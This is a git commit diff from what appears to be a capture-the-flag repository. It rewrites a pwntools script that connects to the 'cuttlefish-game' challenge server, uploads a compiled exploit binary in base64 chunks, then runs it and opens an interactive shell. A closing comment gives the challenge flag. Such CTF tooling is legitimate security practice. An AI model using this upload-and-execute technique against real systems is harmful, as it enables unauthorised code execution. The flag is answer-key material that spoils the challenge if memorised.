edca53082945ee7e7f374f70813ec925aeccad03
Ryan McVeety <rpm0618@gmail.com>
2021-11-08 22:53:55 -0500

    Some more typo fixes, update the upload script for cuttlefish-game

--- damctf/cuttlefish-game/upload.py
+++ damctf/cuttlefish-game/upload.py
@@ -1,57 +1,73 @@
-# Todo: figure out a better file transer mechanism
+"""
+Uploads and executes exploit for cuttlefish-game, expects exploit executable to be in a file called
+"exploit"
 
+Ideally the exploit has been compiled with musl-gcc to decrease the amount of data we need to send
+
+File upload based on https://github.com/ARESxCyber/pwnkernel/blob/master/helper_scripts/client.py
+Changes from original version:
+- Turned off remote echo (stty -echo). Previously the server was effectively sending our file back
+  to us, as it was echoing each "echo -n ..." chunk back to us.
+- run "base64 -d" after all of the parts have been sent and combined. This keeps the sending of
+  each individual chunk as quick as possible, and ensures we don't get errors decoding due to
+  cutting the base64 stream in a weird place.
+"""
+
+import os
+import gzip
+from pathlib import Path
+
+os.environ["PWNLIB_NOTERM"] = "true"
 from pwn import *
 
 def chunks(lst, n):
-    """Yield successive n-sized chunks from lst."""
     for i in range(0, len(lst), n):
         yield lst[i:i + n]
 
-# nc chals.damctf.xyz 30456
-r = remote("chals.damctf.xyz", 30456)
 
-payload = b64e(read("./exploit")).encode()
-payload_chunks = chunks(payload, len(payload)//32)
+def shell(io, cmd):
+    io.sendline(cmd)
+    io.recvuntil(b"$")
 
-orig_level = context.log_level
-context.log_level = "debug"
+
+def send_file(io, file_path, chunk_size=512):
+    data = open(file_path, "rb").read()
+    data = gzip.compress(data)
+    data = b64e(data).encode()
+
+    print(f"SEND FILE {file_path.name} | START ({len(data)}B)")
+   
+    io.sendline()
+    for i, chunk in enumerate(chunks(data, chunk_size)):
+        if i == 0:
+            print
+        shell(io, f"echo -n {chunk.decode()} > {i:08}.part".encode())
+        print(".", end="", flush=True)
+    print()
+
+    print(f"SEND FILE {file_path.name} | CLEAN UP")
+
+    shell(io, f"cat *.part | base64 -d > {file_path.name}.gz".encode())
+    shell(io, f"gzip -d {file_path.name}.gz".encode())
+    shell(io, b"rm *.part")
+    
+    print(f"SEND FILE {file_path.name} | DONE")
+
+
+io = remote("chals.damctf.xyz", 30456)
+
 print("BOOTING")
+io.recvuntil(b"$")
 
-r.recvuntil(b"-sh")
+shell(io, b"stty -echo")
 
-curr_chunk = 0
-for chunk in payload_chunks:
-    r.sendlineafter(b"$", b'stty -echo; echo "start" >&2; while read line; do if [ "$line" = "end" ]; then break; fi; printf $line >> tmp; done; stty echo; echo "done" >&2;')
-    
-    print("WAITING")
-    r.recvuntil(b"start\r")
-    
-    print(f"SENDING CHUNK {curr_chunk}")
+exploit_path = Path("./exploit")
+send_file(io, exploit_path)
 
-    context.log_level = orig_level
+shell(io, b"chmod +x ./exploit")
 
-    to_send = chunk
-    while to_send:
-        r.sendline(to_send[:1000])
-        to_send = to_send[1000:]
-        if len(to_send) // 10000 % 10 == 0:
-            print(len(to_send))
-    r.send(b"\nend\n")
+io.sendline(b"./exploit")
 
-    context.log_level = 'debug'
-
-    print("SENDING DONE")
-
-    print("WAITING")
-    r.recvuntil(b"done");
-
-    curr_chunk += 1
-
-context.log_level = 'debug'
-
-r.sendlineafter(b"$", b"base64 -d tmp > exploit; chmod +x exploit")
-r.sendlineafter(b"$", b"./exploit")
-
-r.interactive()
+io.interactive()
 
 # dam{a_B1t_0f_4_cl1ch3d_r3f4reNc3}
